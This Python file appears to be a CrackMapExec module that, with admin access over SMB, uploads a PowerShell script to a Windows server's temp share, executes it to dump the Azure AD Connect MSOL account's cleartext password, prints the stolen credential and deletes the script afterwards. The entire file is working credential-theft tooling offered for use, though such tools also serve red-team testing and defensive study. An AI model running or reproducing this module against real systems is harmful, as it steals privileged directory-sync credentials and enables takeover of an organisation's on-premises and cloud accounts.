# MSOL module for CME 
# Author of the module : https://twitter.com/Daahtk
# Based on the article : https://blog.xpnsec.com/azuread-connect-for-redteam/

from base64 import b64decode
from sys import exit
from os import path

class CMEModule:

   name = 'msol'
   description = 'Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server'
   supported_protocols = ['smb']
   opsec_safe = True 
   multiple_hosts = True

   def options(self, context, module_options):
       '''
           MSOL_PS1   // Path to the msol binary on your computer
       '''

       self.tmp_dir = "C:\\Windows\\Temp\\"
       self.share = "C$"
       self.tmp_share = self.tmp_dir.split(":")[1]
       self.msol = "msol.ps1"
       self.useembeded = True
       self.msolmdl = self.cmd = ""

       with open(get_ps_script('msol_dump/msol_dump.ps1'), 'r') as msolsc:
           self.msol_embedded = msolsc.read()      

       if "MSOL_PS1" in module_options:
           self.MSOL_PS1 = module_options["MSOL_PS1"]
           self.useembeded = False


   def execscript(self, _, connection):
        command = f"C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe {self.tmp_dir}msol.ps1"
        return connection.execute(command, True)
        
   def on_admin_login(self, context, connection):

        if self.useembeded:
            file_to_upload = "/tmp/msol.ps1"
            with open(file_to_upload, 'w') as msol:
                msol.write(self.msol_embedded)
        else:
            if path.isfile(self.MSOL_PS1):
               file_to_upload = self.MSOL_PS1
            else:
               context.log.error(f"Cannot open {self.MSOL_PS1}")
               exit(1)

        context.log.display(f"Uploading {self.msol}")
        with open(file_to_upload, 'rb') as msol:
            try:
               connection.conn.putFile(self.share, f"{self.tmp_share}{self.msol}", msol.read)
               context.log.success(f"Msol script successfully uploaded")
            except Exception as e:
               context.log.error(f"Error writing file to share {self.tmp_share}: {e}")
               return
        try:
            if self.cmd == "":
                context.log.display(f"Executing the script")
                p = self.execscript(context, connection)
                for line in p.splitlines():
                    p1, p2 = line.split(" ", 1)
                    context.log.highlight(f"{p1} {p2}")
            else :
                context.log.error(f"Script Execution Impossible")
                
        except Exception as e:
            context.log.error(f"Error runing command: {e}")
        finally:
            try:
                connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.msol}")
                context.log.success(f"Msol script successfully deleted")
            except Exception as e:
                context.log.error(f"Error deleting msol script on {self.share}: {e}")
